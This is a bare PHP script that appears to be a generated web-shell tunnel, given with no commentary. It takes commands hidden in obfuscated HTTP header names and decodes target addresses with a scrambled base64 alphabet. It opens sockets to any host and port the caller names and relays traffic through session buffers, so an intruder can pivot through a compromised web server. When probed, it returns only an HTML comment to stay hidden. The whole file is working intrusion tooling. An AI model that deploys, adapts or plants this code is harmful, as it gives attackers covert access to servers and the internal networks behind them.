<?php
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
error_reporting(E_ERROR | E_PARSE);

if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(200);

if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
                    foreach($rx_matches as $ak_key => $ak_val) {
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }

                    $arh_key = implode('-', $rx_matches);
                }
                $arh[ucwords(strtolower($arh_key))] = $val;
            }
        }
        return($arh);
    }
}

set_time_limit(0);
$headers=apache_request_headers();
$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
$de = "PFsUDvpqtizHRKSAlTx/cCmnj6NbL72E9B5gIaOyV4d1kYoQfeXr3M+GZ8WJ0whu";

$cmd = $headers["Ofnntsajvysckkb"];
$mark = substr($cmd,0,22);
$cmd = substr($cmd, 22);
$run = "run".$mark;
$writebuf = "writebuf".$mark;
$readbuf = "readbuf".$mark;

switch($cmd){
    case "mKQ0kLRB4ag3dmfoWkBUIFfM3LQfSlFGlAjIsxs9k8_4sszIJL":
        {
            $target_ary = explode("|", base64_decode(strtr($headers["Xbwadwje"], $de, $en)));
            $target = $target_ary[0];
            $port = (int)$target_ary[1];
            $res = fsockopen($target, $port, $errno, $errstr, 1);
            if ($res === false)
            {
                header('Hvius: KUtvEhMjyEGSGdgGnFX_vLaXtHto5lh9ZBg2QGvC20ISdKUaC');
                header('Ttkiurvlkuotv: HO2unWSyO20dEEPp6UR6u9DuPzSLolex75vOmz1hyIHF8pFHkV5PDOzzDu');
                return;
            }

            stream_set_blocking($res, false);
            ignore_user_abort();

            @session_start();
            $_SESSION[$run] = true;
            $_SESSION[$writebuf] = "";
            $_SESSION[$readbuf] = "";
            session_write_close();

            while ($_SESSION[$run])
            {
                if (empty($_SESSION[$writebuf])) {
                    usleep(50000);
                }

                $readBuff = "";
                @session_start();
                $writeBuff = $_SESSION[$writebuf];
                $_SESSION[$writebuf] = "";
                session_write_close();
                if ($writeBuff != "")
                {
                    stream_set_blocking($res, false);
                    $i = fwrite($res, $writeBuff);
                    if($i === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                }
                stream_set_blocking($res, false);
                while ($o = fgets($res, 10)) {
                    if($o === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                    $readBuff .= $o;
                }
                if ($readBuff != ""){
                    @session_start();
                    $_SESSION[$readbuf] .= $readBuff;
                    session_write_close();
                }
            }
            fclose($res);
        }
        @header_remove('set-cookie');
        break;
    case "1ddfwZPAXSjP_FrFXhirLW2Nf3oK4WYcp13iU5fgOYBFTZRGkECfLJKbijwbZMP":
        {
            @session_start();
            unset($_SESSION[$run]);
            unset($_SESSION[$readbuf]);
            unset($_SESSION[$writebuf]);
            session_write_close();
        }
        break;
    case "jRGesAom6e9zGkIM0GI2_jJBtdiLpK3nV8J9XGSbFEiak":
        {
            @session_start();
            $readBuffer = $_SESSION[$readbuf];
            $_SESSION[$readbuf]="";
            $running = $_SESSION[$run];
            session_write_close();
            if ($running) {
                header('Hvius: Giwml29ZbS2I3jjAPhIaDWaCo87aYxTFITz');
                header("Connection: Keep-Alive");
                echo strtr(base64_encode($readBuffer), $en, $de);
            } else {
                header('Hvius: KUtvEhMjyEGSGdgGnFX_vLaXtHto5lh9ZBg2QGvC20ISdKUaC');
            }
        }
        break;
    case "SUgnrl": {
            @session_start();
            $running = $_SESSION[$run];
            session_write_close();
            if(!$running){
                header('Hvius: KUtvEhMjyEGSGdgGnFX_vLaXtHto5lh9ZBg2QGvC20ISdKUaC');
                header('Ttkiurvlkuotv: 7oWpLAKwMuasWfPmCQIZWbBehDtXmEXAgStOXrZ_sIRWCyTS_');
                return;
            }
            header('Content-Type: application/octet-stream');
            $rawPostData = file_get_contents("php://input");
            if ($rawPostData) {
                @session_start();
                $_SESSION[$writebuf] .= base64_decode(strtr($rawPostData, $de, $en));
                session_write_close();
                header('Hvius: Giwml29ZbS2I3jjAPhIaDWaCo87aYxTFITz');
                header("Connection: Keep-Alive");
            } else {
                header('Hvius: KUtvEhMjyEGSGdgGnFX_vLaXtHto5lh9ZBg2QGvC20ISdKUaC');
                header('Ttkiurvlkuotv: JIDyf');
            }
        }
        break;
    default: {
        @session_start();
        session_write_close();
        exit("<!-- 3JB72fM7BAETXrWCSklR -->");
    }
}
